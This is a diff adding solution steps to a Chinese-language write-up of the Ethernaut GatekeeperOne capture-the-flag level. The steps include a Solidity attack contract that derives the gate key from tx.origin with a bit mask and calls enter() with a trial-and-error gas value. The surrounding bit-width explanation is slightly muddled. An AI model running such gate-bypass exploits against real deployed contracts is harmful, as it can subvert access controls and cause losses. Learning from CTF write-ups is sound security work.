@@ -51,3 +51,26 @@ for (uint256 i = 0; i < 8191; i++) {
 - uint64(_gateKey)的低32位必须等于tx.origin的低16位，uint64(_gateKey) 的低 32 位必须与 tx.origin 的低16位一致。
 所以bytes8 _gateKey = bytes8(tx.origin) & 0xFFFFFFFF0000FFFF；
 ## 解题步骤：
+1. 打开remix，部署攻击合约：
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface IGatekeeperOne {
+    function enter(bytes8 _gateKey) external returns (bool);
+}
+
+contract GatekeeperOne {
+    address levelInstance;
+
+    constructor(address _levelInstance) {
+        levelInstance = _levelInstance;
+    }
+
+    function attack() public {
+        bytes8 key = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
+        IGatekeeperOne(levelInstance).enter{gas: 40526}(key);
+    }
+}
+```gas的具体值是我根据remix的debug功能试验出来的，背后原理我还没怎么摸清楚，以后再补充。
+2. 发动attack提交过关。
